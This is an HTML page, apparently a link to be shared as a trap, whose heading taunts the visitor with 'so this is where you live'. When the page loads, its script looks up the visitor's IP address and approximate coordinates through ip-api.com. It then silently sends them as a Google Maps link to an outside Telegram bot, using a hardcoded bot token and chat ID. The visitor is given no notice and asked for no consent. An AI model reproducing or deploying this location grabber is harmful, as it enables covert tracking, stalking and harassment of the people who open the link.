<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8" />
  <title>Prenses Yakalama</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
      background: #f0f0f0;
      color: #333;
    }
    #ipDisplay {
      font-size: 30px;
      margin-top: 40px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>Deməli burda yaşayırsan hə?:</h1>
  <div id="ipDisplay">Loading...</div>

  <script>
    const token = '8408687620:AAEy2vYnaR8Be9kpbjoKpCTUAXMMHvvd4AE';
    const chatId = '1689497109';

    async function sendLocationToTelegram(ip, lat, lon) {
      const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
      const message = encodeURIComponent(`Yeni istifadəçinin IP-si: ${ip}\nYer: ${mapUrl}`);
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;

      try {
        const response = await fetch(url);
        if (!response.ok) {
          console.error('Telegrama mesaj göndərilə bilmədi');
        }
      } catch (error) {
        console.error('Xəta:', error);
      }
    }

    async function getIpAndSend() {
      try {
        const res = await fetch('http://ip-api.com/json');
        const data = await res.json();
        const ip = data.query;
        const lat = data.lat;
        const lon = data.lon;

        document.getElementById('ipDisplay').textContent = ip;
        sendLocationToTelegram(ip, lat, lon);
      } catch (error) {
        document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
        console.error('IP alınarkən xəta:', error);
      }
    }

    window.onload = () => {
      getIpAndSend();
    };
  </script>
</body>
</html>
